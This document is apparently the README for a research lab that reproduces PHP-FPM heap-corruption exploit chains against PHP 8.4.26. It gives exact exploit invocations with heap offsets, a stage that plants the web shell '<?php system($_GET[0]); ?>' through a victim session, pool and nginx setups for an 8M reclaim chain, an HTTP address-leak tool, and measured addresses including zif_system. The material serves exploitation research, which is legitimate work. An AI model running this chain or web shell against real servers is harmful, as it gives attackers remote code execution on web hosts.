# PHP-FPM laboratory (128M / 8M)

This is the lab used by `src/tools/fpm_chain.py` (128M) and
`src/tools/fpm_reclaim.py` (8M reclaim).

## 128M deterministic chain

Build a PHP 8.4.26 FPM image with `-g` (or use the official
`php:8.4.26-fpm` for the 128M chain; the heap constants are portable), mount:

```text
php-128m.ini -> /srv/php-128m.ini
www-1.conf   -> /srv/www-1.conf
nginx.conf   -> /etc/nginx/nginx.conf
www/         -> /srv/www/
sessions/    -> /var/lib/php/sessions/
```

Start:

```bash
php-fpm -D -y /srv/www-1.conf -c /srv/php-128m.ini
nginx -g 'daemon off;'
```

Then:

```bash
python3 src/tools/fpm_chain.py --url http://127.0.0.1 --workers 1 --attempts 1 \
  --stages r3 --e-off 0x83000 --dt-off 0x6b000 --writer 0x581e0 \
  --big-dt-size 13312 --big-e-size 45056 --base-dt 0x68018 --base-e 0x81018 \
  --r3-scalars 2 --victim-sid vic --victim-path /sess.php \
  --r3-key '<?php system($_GET[0]); ?>' --r3-dt-used 0 \
  --big 53 --prime-press 400 --plain /index.php --index /index.php
```

## 8M reclaim chain

The reclaim chain needs a **builder pool at 64M** and a **chain pool at 8M**.
Two pools can share one php-fpm master:

```ini
[chain]
listen = 127.0.0.1:9000
pm = static
pm.max_children = 1
php_admin_value[memory_limit] = 8M
php_admin_value[session.upload_progress.cleanup] = On

[builder]
listen = 127.0.0.1:9001
pm = static
pm.max_children = 1
php_admin_value[memory_limit] = 64M
php_admin_value[session.upload_progress.cleanup] = Off
```

The two pools must share `session.save_path`. nginx needs two server blocks
(8080 -> 9000, 8081 -> 9001). The chain pool needs `app.php` (session_start +
reflects session values), `bigvar.php` and `ref.php`; see `docs/research/fpm-8m-reclaim.md` for the
exact request shapes and `src/tools/fpm_reclaim.py` for the client. Ready-to-use
copies are in `reclaim/`.

`--leak` removes the need for a debugger: `src/tools/fpm_leak.py` recovers the
chunk and PIE bases over HTTP, on both the debug build and the official
stripped `php:8.4.26-fpm` image (`docs/research/fpm-8m-http-leak.md`). The
4-worker variant is `reclaim/php-fpm-reclaim-4w.conf`; pin three children with
`www/pin.php` so leak and endgame share the free child.

The debug build used in the 3/3 proof has:

```text
zif_system   = 0x50a0f0
basic_globals= 0x16cc640
d_off        = 0x6f000
k            = 0xfe8
pads         = []
reclaim_size = 8192
```

These are build/shape-specific; re-measure for another build.
